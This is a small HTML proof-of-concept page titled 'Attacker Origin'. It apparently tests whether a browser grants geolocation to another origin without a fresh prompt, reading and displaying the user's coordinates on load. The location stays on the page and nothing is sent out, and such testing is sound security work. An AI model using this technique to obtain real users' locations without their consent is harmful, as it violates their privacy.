<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Attacker Origin</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body style="font-family:system-ui; text-align:center; margin-top:80px">

<h2>Attacker Origin</h2>
<p id="origin"></p>
<p id="status">Checking permission stateâ€¦</p>

<script>
// Explicitly show current origin
document.getElementById('origin').textContent =
  'Current origin: ' + location.origin;

// Show permission state ON LOAD
if (navigator.permissions) {
  navigator.permissions.query({ name: 'geolocation' })
    .then(p => {
      document.getElementById('status').textContent =
        'Permission state on load: ' + p.state;
    });
}

// Attempt to read location WITHOUT triggering a new prompt
navigator.geolocation.getCurrentPosition(
  pos => {
    document.getElementById('status').textContent +=
      '\nGot location: ' +
      pos.coords.latitude + ', ' +
      pos.coords.longitude;
  },
  err => {
    document.getElementById('status').textContent =
      'Error: ' + err.message;
  }
);
</script>

</body>
</html>
